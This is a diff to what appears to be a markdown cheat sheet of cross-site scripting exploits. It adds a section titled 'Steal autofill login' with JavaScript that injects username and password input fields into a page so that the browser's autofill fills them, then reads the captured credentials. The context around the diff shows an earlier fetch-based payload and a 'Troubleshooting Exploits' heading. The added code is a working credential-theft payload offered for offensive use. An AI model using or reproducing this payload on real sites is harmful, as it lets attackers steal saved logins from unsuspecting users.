@@ -83,5 +83,22 @@ const response = await fetch(url, {
 }).then(()=>console.log("Success!"));
 </script>
 ```
+## Steal autofill login
+```js
+
+// Create Username and password elements
+var userEle = document.createElement("input");
+userEle.name = "username";
+var passwdEle = document.createElement("input");
+passwdEle.name = "password";
+passwdEle.type = "password";
+[userEle, passwdEle].forEach((ele) => {
+    document.body.appendChild(ele);
+});
+// Username and password are now in these values
+var user = userEle.value;
+var pass = passwdEle.value;
+```
+
 ## Troubleshooting Exploits
 * Check on different browser
